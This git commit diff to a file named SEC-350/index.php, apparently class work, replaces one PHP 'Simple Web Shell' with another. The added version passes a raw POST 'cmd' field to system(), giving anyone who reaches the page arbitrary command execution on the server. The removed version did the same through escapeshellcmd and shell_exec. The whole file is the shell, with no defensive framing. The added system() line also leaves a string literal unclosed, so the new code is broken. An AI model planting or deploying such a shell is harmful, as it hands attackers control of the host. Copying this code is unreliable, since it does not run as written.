a25e1d10237bfa9d46a966e856cb0c3833734a10
Chris Saunders <christophersaunders@comcast.net>
2026-02-16 22:32:28 -0500

    Update index.php

--- SEC-350/index.php
+++ SEC-350/index.php
@@ -1,27 +1,19 @@
 <html>
-  <title>
-    Simple Web Shell
-  </title>
-  <body>
-    <?php
-      $output = ""; // Initialize output variable
-      if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['submit_command'])) {
-      $command = escapeshellcmd($_POST['command_input']);
-      $output = shell_exec($command);
-      if ($output === null) {
-        $output = "Error: Command failed or produced no output.";
-      }
-      }
-      ?>
-    
-    <form action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" method="post">
-      <label for="command_input">Enter Command:</label><br>
-      <input type="text" id="command_input" name="command_input" value="<?php echo htmlspecialchars($_POST['command_input'] ?? '', ENT_QUOTES); ?>">
-      <input type="submit" name="submit_command" value="Run Command">
-    </form>
-    <?php if (!empty($output)): ?>
-    <h3>System Output:</h3>
-    <pre><?php echo htmlspecialchars($output, ENT_QUOTES); ?></pre>
-    <?php endif; ?>
-  </body>
+<title>
+Simple Web Shell
+</title>
+<body>
+<h2>Command To Execute</h2>
+<form method="POST" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+if(isset($_POST['cmd'])) {
+system($_POST['cmd'] . ' 2>&1);
+}
+?>
+</pre>
+</body>
 </html>
